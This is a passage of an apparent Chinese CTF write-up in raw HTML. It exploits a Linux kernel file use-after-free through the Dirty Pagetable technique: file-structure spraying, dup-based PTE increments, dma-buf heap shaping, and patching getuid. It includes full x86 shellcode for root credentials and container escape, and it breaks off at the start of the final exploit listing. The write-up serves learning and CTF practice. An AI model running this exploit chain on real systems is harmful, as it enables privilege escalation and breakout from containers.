class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>*<span class="title">f_ep</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* #ifdef CONFIG_EPOLL */</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>*<span class="title">f_mapping</span>;</span></span><br><span class="line"><span class="type">errseq_t</span>f_wb_err;</span><br><span class="line"><span class="type">errseq_t</span>f_sb_err; <span class="comment">/* for syncfs */</span></span><br><span class="line">&#125; __randomize_layout</span><br><span class="line">  __attribute__((aligned(<span class="number">4</span>)));<span class="comment">/* lest something weird decides that 2 is OK */</span></span><br></pre></td></tr></table></figure><p>我们可以用 file 结构体去占位 uaf 的堆块，然后使用 kfree 释放该 file 结构体就会出现一个 file uaf。由于 file 结构体是使用 filp 进行单独管理的，所以我们这里还是要想办法让 file uaf 对应的 slab 给 buddy system 回收，这里我选用的方法依然是喷射大量的 file 结构体然后全部释放来解决。下一个问题就是如何在用户态知道哪个 file 给释放了，我这里使用的方法是：</p><ul><li>第一次喷射大量只读权限的文件</li><li>利用 kfree 释放其中一个 file 结构体</li><li>第二次喷射大量只写权限的文件</li><li>对向所以第一次喷射的文件写入数据，如果能够写入成功则说明该文件为 uaf 的文件。</li></ul><p>上述过程的流程图大致如下：</p><img src="/2024/11/12/fileuaf/4.png" class="" title="我的图图呢">  <p>上述过程的代码实现如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">info(<span class="string">&quot;spray read file.&quot;</span>);</span><br><span class="line"><span class="type">int</span> read_fd[READ_FD];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; READ_FD; i++)&#123;</span><br><span class="line">    read_fd[i] = open(<span class="string">&quot;/tmp/elf&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(read_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;fail to open /tmp/elf&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">del(uaf_index);</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;spray write file.&quot;</span>);</span><br><span class="line"><span class="type">int</span> write_fd[WRITE_FD];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; WRITE_FD; i++)&#123;</span><br><span class="line">    write_fd[i] = open(<span class="string">&quot;/tmp/elf&quot;</span>,O_WRONLY);</span><br><span class="line">    <span class="keyword">if</span>(write_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;fail to open /tmp/elf&quot;</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;find the uaf read file&quot;</span>);</span><br><span class="line"><span class="type">int</span> uaf_read_fd = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; READ_FD; i++)&#123;</span><br><span class="line">    <span class="type">int</span> ret = write(read_fd[i], buf, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret &gt; <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] find the uaf read fd %d \n&quot;</span>, i);</span><br><span class="line">        uaf_read_fd = i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(uaf_read_fd == <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;can not find the uaf read fd.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;close the file.&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; TMP_FD; i++)&#123;</span><br><span class="line">    close(tmp_fd[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; READ_FD; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(i == uaf_read_fd)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    close(read_fd[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; WRITE_FD; i++)&#123;</span><br><span class="line">    close(write_fd[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就能够让 PTE 来占位我们的 file uaf 的堆块</p><img src="/2024/11/12/fileuaf/5.png" class="" title="我的图图呢">  <p>给 PTE 占位后 uaf 块在 gdb 调试的结果如下：</p><img src="/2024/11/12/fileuaf/6.png" class="" title="我的图图呢">  <p>可以发现 PTE 所指向物理地址是以 0x1000 递增的，这正好满足一个页的大小。</p><p>然而由于 file 结构体给释放了，所以我们对该 file 进行其他操作基本都会导致 kernel panic，可是 dup 依然可用。通过看 file 结构体的源码我们可以发现有个叫 f_count 的变量在 file + 0x38 的位置，f_count表示文件对象的引用计数，当我们调用dup系统调用复制文件描述符时它将递增。因此，我们获得一个原语来递增 PTE 中的指针。然而正常情况下一个进程最多可以拥有 0x400 个文件描述符，我们无法 dup 很多次，但是我们可以通过 fork 来实现多次 dup。在这道题目中，我们可以看到在 startjail.sh 中有条命令：ulimit -Hn 33000，这表示我们能够在一个进程中最多拥有 33000 个文件描述符，这大大方便了我们对 file uaf 的利用。</p><p>接下来我们就可以对 uaf_file dup 0x1000 次，这时就会出现物理地址的重叠：</p><img src="/2024/11/12/fileuaf/7.png" class="" title="我的图图呢">  <p>利用 dup 函数令 PTE 的条目递增 0x1000:</p><img src="/2024/11/12/fileuaf/8.png" class="" title="我的图图呢">  <p>最终效果如下：</p><img src="/2024/11/12/fileuaf/9.png" class="" title="我的图图呢">  <p>可以看见两个 PTE 条目指向了同一个物理地址，这个时候我们再使用 munmap 释放掉我们重叠的 PTE 对应的虚拟内存，我们就能够构造出物理内存上的 page uaf。有了page uaf 后我们第一时间可能会想到用用户页表占据释放页，这样就能控制用户页表，然而这是不太现实的。匿名 mmap() 分配的物理页来自内存区的MIGRATE_MOVABLE free_area，而用户页表是从内存区的 MIGRATE_UNMOVABLE free_area 分配，所以很难通过递增 PTE 使之指向另一用户页表。这里我们采用另外一种方式来分配物理页，使该物理页和用户页表来自同一内存区域，这样如果受害者PTE指向该物理页，就能通过递增该PTE，使该PTE指向某个用户页表。</p><p>下面的操作来自 dirty pageTable 的文章<a href="https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html">Dirty_Pagetable (yanglingxi1993.github.io)</a>：</p><hr><p>作者选用 dma-buf 系统堆来分配共享页，因为可以从 Android 中不受信任的 APP 来访问 &#x2F;dev&#x2F;dma_heap&#x2F;system，并且 dma-buf 的实现相对简单。通过 open(&#x2F;dev&#x2F;dma_heap&#x2F;system) 可获得一个 dma heap fd，然后用以下代码分配一个共享页：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dma_heap_allocation_data</span> <span class="title">data</span>;</span></span><br><span class="line"></span><br><span class="line">data.len = <span class="number">0x1000</span>;</span><br><span class="line">data.fd_flags = O_RDWR;</span><br><span class="line">data.heap_flags = <span class="number">0</span>;</span><br><span class="line">data.fd = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ioctl(dma_heap_fd, DMA_HEAP_IOCTL_ALLOC, &amp;data) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;DMA_HEAP_IOCTL_ALLOC&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> dma_buf_fd = data.fd;</span><br></pre></td></tr></table></figure><p>由用户空间中的 dma_buf_fd 来表示一个共享页，可通过 mmap() dma_buf_fd 将共享页映射到用户空间。从 dma-buf 系统堆分配的共享页本质上是从页分配器分配的（实际上 dma-buf 子系统采用了页面池进行优化，对于本利用没有影响）。用于分配共享页的 gfp_flags 如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HIGH_ORDER_GFP  (((GFP_HIGHUSER | __GFP_ZERO | __GFP_NOWARN \ <span class="comment">// HIGH_ORDER_GFP 用于 order-8和order-4 page</span></span></span><br><span class="line">                | __GFP_NORETRY) &amp; ~__GFP_RECLAIM) \</span><br><span class="line">                | __GFP_COMP)</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOW_ORDER_GFP (GFP_HIGHUSER | __GFP_ZERO | __GFP_COMP) <span class="comment">// LOW_ORDER_GFP 用于 order-0 page</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">gfp_t</span> order_flags[] = &#123;HIGH_ORDER_GFP, HIGH_ORDER_GFP, LOW_ORDER_GFP&#125;;</span><br></pre></td></tr></table></figure><p>共享页分配 vs 页表分配：从 LOW_ORDER_GFP 可以看出，单个共享页是从内存的 MIGRATE_UNMOVABLE free_area 中分配的，和页表分配的出处一样。且单个共享页为 order-1 （order-0 ?），和页表的 order 相同。结论是，单个共享页和页表都是从同一 migrate free_cache 中分配，且 order 相同。</p><img src="/2024/11/12/fileuaf/10.svg" class="" title="我的图图呢">  <p>可见，在物理内存中，单个共享页和用户页表分布得比较紧凑。现在，我们成功对共享页和用户页表进行了 heap shaping。</p><hr><p>总的来说我们可以利用 dma-buf 来辅助我们让物理地址 page uaf 的堆块给 DMA-buf heap 给占位，而该 heap 在物理地址上与另外一个 PTE 相邻，此时我们即可再次利用 file uaf 来令 victim PTE 指向 PTE 对应的物理地址，进而能够任意修改 PTE 的条目来实现物理地址上的读写，其布置如下：</p><img src="/2024/11/12/fileuaf/11.png" class="" title="我的图图呢">  <p>利用 file uaf 再次 dup 0x1000 后，修改 PTE 的条目：</p><img src="/2024/11/12/fileuaf/12.png" class="" title="我的图图呢">  <p>接下来我们已经拥有修改 PTE 的能力，那我们肯定要先获取 kernel 代码段的基址才能够对代码段进行写操作，这个地方的操作比较牛逼，这里引用<a href="https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606">Understanding Dirty Pagetable - m0leCon Finals 2023 CTF Writeup - CTFするぞ (hatenablog.com)</a>：</p><hr><p>Although it’s already 2024, we can find some fixed physical addresses on both Linux and Windows.</p><img src="/2024/11/12/fileuaf/13.png" class="" title="我的图图呢">  <p>The pages around here is always fixed, and data for page table is left. (Credit to shift_crops who found it during HITCON.) The page table has a pointer to kernel-land physical address, which is useful for leaking the physical base address of the kernel.</p><hr><p>也就是说我们可以直接在这个固定的物理地址上获取某个内核代码段的地址：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Leak kernel physical base</span></span><br><span class="line"><span class="type">void</span> *wwwbuf = <span class="literal">NULL</span>;</span><br><span class="line">*(<span class="type">size_t</span>*)dmabuf = <span class="number">0x800000000009c067</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N_PAGESPRAY; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (page_spray[i] == evil) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">size_t</span>*)page_spray[i] &gt; <span class="number">0xffff</span>) &#123;</span><br><span class="line">        wwwbuf = page_spray[i];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Found victim page table: %p\n&quot;</span>, wwwbuf);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] wwwbuf data: %p \n&quot;</span>, ((*(<span class="type">size_t</span>*)wwwbuf)));</span><br></pre></td></tr></table></figure><p>接下来我们就要找到该地址与内核物理基址的偏移，这里有一个技巧，当我们关闭了 kaslr 时内核的物理基址会固定为 0x1000000，我们可以关闭 kaslr 后再进行对偏移的计算，我们可以在 qemu monitor 中进行验证。</p><img src="/2024/11/12/fileuaf/14.png" class="" title="我的图图呢">  <p>可是开启了 kaslr 后这个偏移会有一点点改变 :( 不过问题不大，在开启 kalsr 时调试改改就行。</p><p>这里其实还可以使用 gef 升级版本来直接进行物理地址和虚拟地址的转换（笔者觉得这个功能真的好牛逼），相关命令为 p2v、v2p  </p><img src="/2024/11/12/fileuaf/16.png" class="" title="我的图图呢">  <p>项目地址为：<a href="https://github.com/bata24/gef">https://github.com/bata24/gef</a>  </p><p>获得内核物理地址基址后就可以直接修改内核的代码段了，我这里选择修改 getuid 函数。</p><h3 id="容器逃逸"><a href="#容器逃逸" class="headerlink" title="容器逃逸"></a>容器逃逸</h3><p>我们的最终目标是进行容器逃逸，这里参考<a href="https://syst3mfailure.io/corjail/">[corCTF 2022] CoRJail: From Null Byte Overflow To Docker Escape Exploiting poll_list Objects In The Linux Kernel (syst3mfailure.io)</a>上的 rop 链</p><p>其对应的 shellcode 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">  init_cred         = 0x2a76b00</span><br><span class="line">  commit_creds      = 0x1c2670</span><br><span class="line">  find_task_by_vpid = 0x1b8fa0 </span><br><span class="line">  init_nsproxy      = 0x2a768c0</span><br><span class="line">  switch_task_namespaces = 0x1c0ad0</span><br><span class="line">  init_fs                = 0x2bb5320</span><br><span class="line">  copy_fs_struct         = 0x45c0f0</span><br><span class="line">  kpti_bypass            = 0x14011c6</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">  endbr64</span><br><span class="line">  call a</span><br><span class="line">a:</span><br><span class="line">  ; r15 equ kernel_base</span><br><span class="line">  lea r15,[rip]</span><br><span class="line">  sub r15, 0x1ab7f0</span><br><span class="line"></span><br><span class="line">  ; commit_creds(init_cred) [3]</span><br><span class="line">  lea rdi, [r15 + init_cred]</span><br><span class="line">  lea rax, [r15 + commit_creds]</span><br><span class="line">  call rax</span><br><span class="line"></span><br><span class="line">  ; task = find_task_by_vpid(1) [4]</span><br><span class="line">  mov edi, 1</span><br><span class="line">  lea rax, [r15 + find_task_by_vpid]</span><br><span class="line">  call rax</span><br><span class="line"></span><br><span class="line">  ; switch_task_namespaces(task, init_nsproxy) [5]</span><br><span class="line">  mov rdi, rax</span><br><span class="line">  lea rsi, [r15 + init_nsproxy]</span><br><span class="line">  lea rax, [r15 + switch_task_namespaces]</span><br><span class="line">  call rax</span><br><span class="line"></span><br><span class="line">  ; new_fs = copy_fs_struct(init_fs) [6]</span><br><span class="line">  lea rdi, [r15 + init_fs]</span><br><span class="line">  lea rax, [r15 + copy_fs_struct]</span><br><span class="line">  call rax</span><br><span class="line">  mov rbx, rax</span><br><span class="line"></span><br><span class="line">  ; current = find_task_by_vpid(getpid()) [7]</span><br><span class="line">  mov rdi, 0x1111111111111111  </span><br><span class="line">  lea rax, [r15 + find_task_by_vpid]</span><br><span class="line">  call rax</span><br><span class="line"></span><br><span class="line">  ; current-&gt;fs = new_fs [8]</span><br><span class="line">  mov [rax + 0x828], rbx</span><br><span class="line"></span><br><span class="line">  ; kpti trampoline [9]</span><br><span class="line">  xor eax, eax</span><br><span class="line">  mov [rsp+0x00], rax</span><br><span class="line">  mov [rsp+0x08], rax</span><br><span class="line">  mov rax, 0x2222222222222222   ; win</span><br><span class="line">  mov [rsp+0x10], rax</span><br><span class="line">  mov rax, 0x3333333333333333   ; cs</span><br><span class="line">  mov [rsp+0x18], rax</span><br><span class="line">  mov rax, 0x4444444444444444   ; rflags</span><br><span class="line">  mov [rsp+0x20], rax</span><br><span class="line">  mov rax, 0x5555555555555555   ; stack</span><br><span class="line">  mov [rsp+0x28], rax</span><br><span class="line">  mov rax, 0x6666666666666666   ; ss</span><br><span class="line">  mov [rsp+0x30], rax</span><br><span class="line">  lea rax, [r15 + kpti_bypass]</span><br><span class="line">  jmp rax</span><br><span class="line"></span><br><span class="line">  int3</span><br></pre></td></tr></table></figure><p>这里需要注意的是 task_struct 结构体中的 fs 对象在不同内核版本中的偏移是不一样的，在这道题目中的偏移是 0x828  </p><p>为了搞懂他是如何实现容器逃逸的，这里先看看这段 shellcode 干了什么，翻译一下，这段 shellcode 干了下面这些事情：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(init_cred);  <span class="comment">// [1]</span></span><br><span class="line"></span><br><span class="line">task = find_task_by_vpid(<span class="number">1</span>);  <span class="comment">// [2]</span></span><br><span class="line">switch_task_namespaces(task, init_nsproxy);  <span class="comment">// [3]</span></span><br><span class="line">new_fs = copy_fs_struct(init_fs);  <span class="comment">// [4]</span></span><br><span class="line">current = find_task_by_vpid(getpid());  <span class="comment">// [5]</span></span><br><span class="line">current-&gt;fs = new_fs;  <span class="comment">// [6]</span></span><br><span class="line">swapgs_restore_regs_and_return_to_usermode();  <span class="comment">// [7]</span></span><br></pre></td></tr></table></figure><p>首先我们要先知道我们为什么可以进行容器逃逸，那是因为 nsjail 和 docker 与我们启动容器的操作系统的是同一个内核。我们可以在 wsl 里面用 docker 启动一个 ubuntu，然后用 uanme -r 命令去验证一下。所以我们只需要进行命名空间的切换即可，而且这个操作可以直接在内核内部实现。由于我们已经可以劫持内核执行流，容器逃逸也就成为了可能。<br>接下来分析一下具体如何实现逃逸：<br>第 1 和 7 项很好理解，就是提权然后从内核态返回用户态。</p><p>我们在容器中可以通过内核函数 find_task_by_vpid 来寻找task_struct，这里我们可以首先在容器内部完成提权，然后使用函数 find_task_by_vpid(1) 来获得容器中的 init&#x2F;swap 进程的 task_struct：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">task = find_task_by_vpid(<span class="number">1</span>); </span><br></pre></td></tr></table></figure><p>接下来我们将当前命名空间下的init进程的命名空间切换为内核当中的 init_proxy，这里是由内核当中提取的，并不是 nsjail 当中的 init_proxy，总结下来就是调用下面的函数：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">switch_task_namespaces(task, init_proxy);</span><br></pre></td></tr></table></figure><p>由于 setns 被过滤，这导致我们无法在返回用户空间后进入其他的命名空间，因此我们需要模拟 setns() 函数中的 commit_nsset() 功能，我们利用函数 copy_fs_struct 获取内核当中的 init_fs 所对应的 fs_struct 结构体，然后赋值给我们当前进程的 task_struct-&gt;fs，这样就实现了资源的转移，也就是说调用下面的函数：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find_task_by_vpid(getpid())-&gt;fs = copy_fs_struct(init_fs);</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>最终的 exp 如下：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span 